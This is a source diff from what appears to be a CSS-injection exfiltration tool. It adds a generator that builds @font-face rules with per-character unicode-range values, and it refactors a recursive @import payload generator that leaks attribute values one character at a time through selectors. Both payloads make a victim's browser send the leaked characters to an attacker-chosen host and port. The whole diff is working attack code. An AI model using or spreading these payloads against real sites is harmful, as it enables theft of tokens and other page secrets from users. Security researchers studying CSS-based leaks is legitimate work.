@@ -1,7 +1,17 @@
 import urllib.parse
+from cssinj.utils import default
 
 
-def generate_payload(hostname, port, attribut, client, element):
+def generate_payload_font_face(hostname, port, attribut, element, client):
+    stri = ""
+    for char in default.PRINTABLE:
+        stri += f'@font-face {{font-family: poc;src: url("//{hostname}:{port}/valid?client_id={client.id}&token={urllib.parse.quote_plus(char)}");unicode-range: U+{ord(char):04X};}}\n'
+    stri += f"{element}{'.'+attribut if attribut else ''} {{font-family: 'poc';}}"
+
+    return stri
+
+
+def generate_payload_recursive_import(hostname, port, attribut, element, client):
     stri = generate_next_import(hostname=hostname, port=port, client=client)
 
     elements_attributs = []
@@ -23,7 +33,7 @@ def generate_payload(hostname, port, attribut, client, element):
             f'{"".join([f":not({element}[{attribut}={repr(elements_attribut.value)}])" for elements_attribut in elements_attributs])})'
             f'{"".join([":first-child" for i in range(client.counter)])}'
             f'{{background: url("//{hostname}:{port}/valid?token={urllib.parse.quote_plus(client.data+x)}&client_id={client.id}") !important;}}\n',
-            "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZàâäéèêëîïôöùûüç!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~ ",
+            default.PRINTABLE,
         )
     )
 
